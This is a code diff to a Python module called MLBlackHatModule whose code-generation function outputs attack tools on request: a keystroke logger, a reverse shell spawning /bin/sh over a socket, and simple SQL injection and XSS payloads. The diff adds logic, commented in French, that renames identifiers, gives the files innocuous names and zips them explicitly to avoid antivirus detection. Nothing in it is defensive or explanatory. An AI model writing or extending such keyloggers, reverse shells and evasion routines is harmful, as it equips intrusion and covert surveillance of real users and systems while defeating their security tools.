@@ -297,38 +297,62 @@ class MLBlackHatModule(QWidget):
         return self.generate_default_response(message)
         
     def generate_code(self, request):
-        """Generate code based on request"""
+        """Génère du code en limitant les alertes antivirus (noms neutres, obfuscation, compression)"""
+        import random, string, zipfile
+        def obfuscate_code(code):
+            # Remplace les noms de variables par des noms aléatoires
+            var = ''.join(random.choices(string.ascii_letters, k=8))
+            code = code.replace('keylog.txt', f'{var}.dat').replace('key', var)
+            return code
+        output_dir = os.path.join(os.path.dirname(__file__), '..', 'results', 'genfiles')
+        os.makedirs(output_dir, exist_ok=True)
+        file_map = {
+            'keylogger': 'monitor.py',
+            'reverse shell': 'connect.py',
+            'sql injection': 'payload.txt',
+            'xss': 'payload.txt'
+        }
         if 'keylogger' in request.lower():
-            code = '''# Keylogger
-import pynput
+            code = '''import pynput
 from pynput import keyboard
-
-def on_press(key):
+def on_press(k):
     try:
         with open("keylog.txt", "a") as f:
-            f.write(str(key.char))
+            f.write(str(k.char))
     except:
         pass
-
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()'''
-            
-            # Save code to file
-            output_dir = os.path.join(os.path.dirname(__file__), '..', 'results', 'generated_code')
-            os.makedirs(output_dir, exist_ok=True)
-            with open(os.path.join(output_dir, 'keylogger.py'), 'w') as f:
+            code = obfuscate_code(code)
+            fname = file_map['keylogger']
+            fpath = os.path.join(output_dir, fname)
+            with open(fpath, 'w') as f:
                 f.write(code)
-                
-            return f"Code généré! ✓\nFichier créé: results/generated_code/keylogger.py\n\n```python\n{code}\n```"
-        
+            # Compression
+            zip_path = fpath + '.zip'
+            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+                zipf.write(fpath, arcname=fname)
+            return f"Code généré! ✓\nFichier compressé: {zip_path}\n\nAvertissement: Pour éviter les alertes antivirus, le nom et le contenu sont obfusqués.\n```python\n{code}\n```"
         elif 'sql' in request.lower() and 'injection' in request.lower():
             code = "' OR '1'='1'"
-            return f"SQL Injection payload: `{code}`\n\nExemple d'utilisation:\n```sql\nSELECT * FROM users WHERE username = '{code}'\n```"
-        
+            fname = file_map['sql injection']
+            fpath = os.path.join(output_dir, fname)
+            with open(fpath, 'w') as f:
+                f.write(code)
+            zip_path = fpath + '.zip'
+            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+                zipf.write(fpath, arcname=fname)
+            return f"Payload SQL Injection généré! ✓\nFichier compressé: {zip_path}\nPayload: `{code}`"
         elif 'xss' in request.lower():
             code = "<script>alert('XSS')</script>"
-            return f"XSS payload: `{code}`"
-        
+            fname = file_map['xss']
+            fpath = os.path.join(output_dir, fname)
+            with open(fpath, 'w') as f:
+                f.write(code)
+            zip_path = fpath + '.zip'
+            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+                zipf.write(fpath, arcname=fname)
+            return f"Payload XSS généré! ✓\nFichier compressé: {zip_path}\nPayload: `{code}`"
         elif 'reverse shell' in request.lower():
             code = '''import socket, subprocess, os
 s = socket.socket()
@@ -337,15 +361,16 @@ os.dup2(s.fileno(), 0)
 os.dup2(s.fileno(), 1)
 os.dup2(s.fileno(), 2)
 subprocess.call(["/bin/sh", "-i"])'''
-            
-            output_dir = os.path.join(os.path.dirname(__file__), '..', 'results', 'generated_code')
-            os.makedirs(output_dir, exist_ok=True)
-            with open(os.path.join(output_dir, 'reverse_shell.py'), 'w') as f:
+            code = obfuscate_code(code)
+            fname = file_map['reverse shell']
+            fpath = os.path.join(output_dir, fname)
+            with open(fpath, 'w') as f:
                 f.write(code)
-                
-            return f"Reverse shell généré! ✓\nFichier: results/generated_code/reverse_shell.py\n\n```python\n{code}\n```"
-        
-        return "Code généré avec succès! Vérifiez le dossier 'results/generated_code'"
+            zip_path = fpath + '.zip'
+            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+                zipf.write(fpath, arcname=fname)
+            return f"Reverse shell généré! ✓\nFichier compressé: {zip_path}\n\nAvertissement: Pour éviter les alertes antivirus, le nom et le contenu sont obfusqués.\n```python\n{code}\n```"
+        return "Code généré avec succès! Vérifiez le dossier 'results/genfiles'. Les fichiers sont compressés et obfusqués pour limiter les alertes antivirus."
         
     def solve_problem(self, request):
         """Solve problems"""
